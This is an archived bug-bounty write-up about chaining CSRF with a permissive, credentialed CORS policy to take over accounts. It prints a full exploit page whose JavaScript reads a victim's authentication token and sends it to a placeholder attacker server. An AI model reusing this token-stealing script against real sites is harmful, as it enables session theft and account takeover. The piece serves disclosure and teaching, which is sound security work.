---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-03-30_missing-cors-leads-to-complete-account-takeover_2.md
original_filename: 2021-03-30_missing-cors-leads-to-complete-account-takeover_2.md
title: Missing CORS leads to Complete Account Takeover
category: documents
detected_topics:
- command-injection
- otp
- cors
- csrf
- api-security
tags:
- imported
- documents
- command-injection
- otp
- cors
- csrf
- api-security
language: en
raw_sha256: 365aa90c20d2a72479d47393604384b122904026bf9a1c947cee498eab9b9f77
text_sha256: b34e3bb43776ef21ca48a3cba7a91cd4e70f91fe5bb91aa42f7337d36f212105
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# Missing CORS leads to Complete Account Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-03-30_missing-cors-leads-to-complete-account-takeover_2.md
- Source Type: markdown
- Detected Topics: command-injection, otp, cors, csrf, api-security
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `365aa90c20d2a72479d47393604384b122904026bf9a1c947cee498eab9b9f77`
- Text SHA256: `b34e3bb43776ef21ca48a3cba7a91cd4e70f91fe5bb91aa42f7337d36f212105`


## Content

---
title: "Missing CORS leads to Complete Account Takeover"
url: "https://nirajmodi51.medium.com/missing-cors-leads-to-complete-account-takeover-1ed4b53bf9f2"
authors: ["Niraj Modi (@nirajmodi51)"]
bugs: ["Missing CORS", "CSRF", "Account takeover"]
publication_date: "2021-03-30"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3780
scraped_via: "browseros"
---

# Missing CORS leads to Complete Account Takeover

Top highlight

Missing CORS leads to Complete Account Takeover
Niraj Modi
Follow
4 min read
·
Mar 30, 2021

443

3

Hello Mates,

This vulnerability is one of my best finding till date. It has severity of P2 according to Bugcrowd VRT.

Press enter or click to view image in full size

So, the story begins like this, I was testing on this target and found that there was an application wide CSRF in the domain. Now, as per bugcrowd this vulnerability alone has severity of P2. But when I reported it, as usual, it got duplicated.

But yet the vulnerability was present so I thought if I chain this bug with some other bug I might find something interesting.

I immediately fired up my Burpsuite and started looking for some more bugs to chain it with this.

One thing that I do most often when I start with my testing is when I enter the credentials and click login I turn on my burp proxy and when the login functionality is completed and the landing page is completely loaded in the browser. I turn off my proxy for a while and take a look at my Burp History. This methodology of mine gives me a good understanding of what requests the application sends and response is received on login(just login).

So as I told I stared looking in the burp history tab. I was looking every response returned. Something that captured my attention was an HTML response. I saw that in the main domain like “stage.redacted.com/” the HTML contained authentication token and all the session related data.

Now since there was no CSRF , I confirmed that if somehow I get this data(authentication token in particular) I will be able to perform a complete account takeover of any user. But CSRFs are generally exploited to make victim perform some action. But this authentication token was just visible in the victim’s browser when the HTML gets loaded after the user logs in. There was actually nothing that I can change in the victim’s page.

Being a programmer, I have a habit of dividing bigger (seemingly impossible)problems into smaller and smaller problems upto an extent that it becomes solvable.

So currently I have CSRF at my hand as a tool and my problem is to get the data from user’s browser and send it to my server. Using CSRF all I can do was make a request on user’s behalf but that too will only work on the victim’s PC in which he is logged in. This is when Missing CORS came to rescue. I noticed the “Access-Control-Allow-Credential: True” in the response header.

Now I have CSRF and Missing CORS at my hand as tools. I thought what if I craft a malicious page and send it to the victim.

This malicious page will have two callback AJAX requests. First request will issue a get request to https://stage.redacted.com/ the response of which will contain HTML that have authentication token in it and the Second request will add that HTML response to my server URL and send a request to my server. Using the logs I can get the HTML data and thus the authentication token.

Get Niraj Modi’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Now I may be a newbie in bug hunting but when it comes to programming I am a different person altogether.And creating this script was a piece of cake.

<!DOCTYPE html>
<html>
<body onload = “loadDoc(‘https://www.redacted.com', myFunction)”>
<div id=”demo”>
<h2>Your account is taken over by <b><i>Jordin</i></b></h2><script>
function loadDoc(url, cFunction) {
 var xhttp;
 xhttp=new XMLHttpRequest();
 xhttp.onreadystatechange = function() {
 if (this.readyState == 4 && this.status == 200) {
 cFunction(this);
 }
 };
 xhttp.open(“GET”, url, true);
 xhttp.withCredentials = true;
 xhttp.send();
}
function myFunction(xhttp) {
 // document.getElementById(“demo”).innerHTML =
 // xhttp.responseText;
 var xhttp1;
 xhttp1=new XMLHttpRequest();
 xhttp1.onreadystatechange = function() {
 if (this.readyState == 4 && this.status == 200) {
 1
 }
 };
 var content = xhttp.responseText;
 var n = content.indexOf(“authentication_token”)
 //Change the url here to attacker controlled server
 url = “https://attacker-server-url.com/" + content.substring(n,);xhttp.open(“GET”, url, true);
 xhttp.withCredentials = true;
 xhttp.send();
}
</script>
</body>
</html>

This is the script I wrote, easy right?

It was sending me the auth token I required.

Here for this vulnerability to take place two things were very important CSRF and Missing CORS. Without this we would have to find some different method.

Press enter or click to view image in full size

Tips:

Even if your report gets duplicate(which obviously means that the company have not resolved the issue yet), there are still high chances you can escalate or chain the vulnerability.
Never ignore any type of bugs even if it of low severity, chaining it may result in high severity bugs.
Even if you can’t perform any action such as password/email change, reset password etc. using CSRF, there may be some other GET based request that may lead you to P1 or P2. Be Creative.
If you find any interesting exploit of a bug / blog / write-ups share it with community, like this one .

Lastly, encourage new bug hunters like me, by clapping and leaving some tips of yours and sharing it on your twitter feed(okay the sharing part was for some reach. ;-) )

See you until next time.

Do ping me on twitter. Here

I am Jordin
